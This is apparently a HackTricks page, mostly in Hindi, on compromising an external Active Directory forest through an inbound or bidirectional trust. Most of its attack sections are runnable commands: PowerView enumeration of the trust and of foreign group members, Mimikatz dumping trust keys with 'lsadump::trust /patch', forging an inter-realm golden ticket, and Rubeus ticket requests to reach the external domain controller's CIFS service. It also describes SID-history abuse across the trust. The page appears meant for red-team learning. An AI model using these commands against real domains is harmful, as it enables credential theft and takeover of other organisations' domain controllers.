# External Forest Domain - OneWay (Inbound) or bidirectional

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

इस परिदृश्य में एक बाहरी डोमेन आप पर भरोसा कर रहा है (या दोनों एक-दूसरे पर भरोसा कर रहे हैं), इसलिए आप इसके ऊपर कुछ प्रकार की पहुंच प्राप्त कर सकते हैं।

## Enumeration

सबसे पहले, आपको **enumerate** करना होगा **trust**:
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
In the previous enumeration it was found that the user **`crossuser`** is inside the **`External Admins`** group who has **Admin access** inside the **DC of the external domain**.

## प्रारंभिक पहुँच

यदि आप **किसी विशेष** पहुँच को अपने उपयोगकर्ता के लिए अन्य डोमेन में नहीं ढूंढ पाए, तो आप अभी भी AD पद्धति पर वापस जा सकते हैं और **एक गैर-विशिष्ट उपयोगकर्ता से प्रिवेस्क करने** की कोशिश कर सकते हैं (जैसे कि केरबेरोस्टिंग):

आप **Powerview फ़ंक्शंस** का उपयोग करके `-Domain` पैरामीटर के साथ **अन्य डोमेन** को **एन्यूमरेट** कर सकते हैं जैसे:
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## impersonation

### लॉगिन करना

बाहरी डोमेन तक पहुँच रखने वाले उपयोगकर्ताओं के क्रेडेंशियल्स के साथ एक सामान्य विधि का उपयोग करते हुए, आपको निम्नलिखित तक पहुँच प्राप्त करनी चाहिए:
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID इतिहास का दुरुपयोग

आप एक वन ट्रस्ट के पार [**SID इतिहास**](sid-history-injection.md) का भी दुरुपयोग कर सकते हैं।

यदि एक उपयोगकर्ता **एक वन से दूसरे वन में** स्थानांतरित किया जाता है और **SID फ़िल्टरिंग सक्षम नहीं है**, तो **दूसरे वन से एक SID जोड़ना** संभव हो जाता है, और यह **SID** **विश्वास के पार** प्रमाणीकरण करते समय **उपयोगकर्ता के टोकन** में **जोड़ा** जाएगा।

{% hint style="warning" %}
याद दिलाने के लिए, आप साइनिंग कुंजी प्राप्त कर सकते हैं
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
```
{% endhint %}

आप **विश्वसनीय** कुंजी के साथ एक **TGT का अनुकरण** कर सकते हैं जो वर्तमान डोमेन के उपयोगकर्ता का है।
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### उपयोगकर्ता का पूर्ण तरीके से अनुकरण करना
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
{% hint style="success" %}
सीखें और AWS हैकिंग का अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
सीखें और GCP हैकिंग का अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमारे साथ जुड़ें** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
